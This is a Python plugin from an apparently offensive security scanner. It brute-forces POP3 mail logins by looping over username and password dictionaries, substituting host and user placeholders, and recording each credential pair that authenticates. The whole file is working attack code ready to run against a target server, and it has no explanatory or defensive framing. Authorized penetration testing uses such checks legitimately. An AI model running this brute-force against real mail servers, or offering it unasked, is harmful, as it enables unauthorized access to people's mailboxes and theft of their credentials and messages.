#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
import socket
import poplib
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.POP3
        self.name = 'pop3 burst'
        self.keyword = ['pop3', 'burst']
        self.info = 'pop3 burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        if _socket_connect(self.target_host, self.target_port):
            flag = 3
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else  self.read_file('dict/pop3_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else  self.read_file('dict/pop3_passwords.txt')
            for linef1 in usernamedic:
                username = linef1.strip('\r').strip('\n')
                try:
                    username1 = username.replace("%host%", '.'.join(self.target_host.split('.')[1:]))
                except:
                    username1 = username
                for linef2 in passworddic:
                    password = linef2.replace("%user%", username).strip('\r').strip('\n').replace("@%host%", '')
                    try:
                        time.sleep(0.2)
                        socket.setdefaulttimeout(3)
                        pop = poplib.POP3(self.target_host, self.target_port)
                        pop.user(username1)
                        auth = pop.pass_(password)
                        if auth.split(' ')[0] != "+OK":
                            pop.quit()
                            continue
                        if pop.stat()[1] is None or pop.stat()[1] < 1:
                            pop.quit()
                            continue
                        ret = (username1, password, pop.stat()[0], pop.stat()[1])
                        self.flag = 1
                        self.req.append({"username": username1, "password": password})
                        self.res.append({"info": username1 + "/" + password, "key": 'pop3'})
                        pop.quit()
                        break
                    except Exception as e:
                        if "timed out" in str(e):
                            if flag == 0 :
                                return
                            flag -= 1

def _socket_connect(ip, port,msg = "test"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        s.sendall(bytes(msg, 'utf-8'))
        message = str(s.recv(1024))
        s.close()
        return True
    except:
        return False
